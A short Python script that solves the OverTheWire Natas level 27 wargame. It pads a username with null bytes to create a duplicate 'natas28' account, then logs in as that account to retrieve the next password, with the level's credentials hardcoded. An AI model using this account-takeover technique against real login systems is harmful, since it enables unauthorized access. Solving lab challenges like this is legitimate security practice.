import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas27", "u3RRffXjysjgwFU6b9xa23i6prmUsYne")

user = "natas28"

url = f"http://natas27.natas.labs.overthewire.org"
params = { "username": user + "%00"*64 + "x", "password": "a" }

res = requests.get(url, auth=auth, params=params)

print(res.text)

params = { "username": user, "password": "a" }
res = requests.get(url, auth=auth, params=params)
print(res.text)